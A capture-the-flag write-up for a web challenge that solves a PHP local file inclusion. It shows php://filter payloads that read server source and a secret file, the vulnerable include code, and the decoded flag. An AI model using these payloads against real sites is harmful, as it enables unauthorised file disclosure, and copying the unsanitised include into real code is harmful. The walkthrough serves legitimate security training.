# Challenge description

Try to find the flag from the website.

N:B: I'm a n00b developer.

Website Link

Note : Burte Force/Fuzzing not required and not allowed.

Flag Format: KCTF{S0m3_T3xt_H3re}

**Author: TareqAhmed**

-----------------------------------------------------------
img1
From the url we can tell that this is an LFI

So trying out different urls like **flag.php** , **flag.txt** didn't work until i tried **index.php** and we get this ERROR message 
img2

So it seems like it's blocking us somehow or its "filtering" us out so using this payload we can bypass that 

```
?file=php://filter/convert.base64-encode/resource=index.php
``` 
You can find more LFI payloads at this repo 

> https://github.com/payloadbox/rfi-lfi-payload-list

img3

so we just decode it ! 

```php,html
<?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}

?>

```

Now that we know where the flag is we can simply change our payload to : 

```
?file=php://filter/convert.base64-encode/resource=s3crEt_fl49.txt 
```

and we get our base64 encoded flag :

> S0NURntMMEM0TF9GMUwzXzFuY0x1NzEwbn0K

and we just decode it and here's our flag

``` KCTF{L0C4L_F1L3_1ncLu710n}  ```













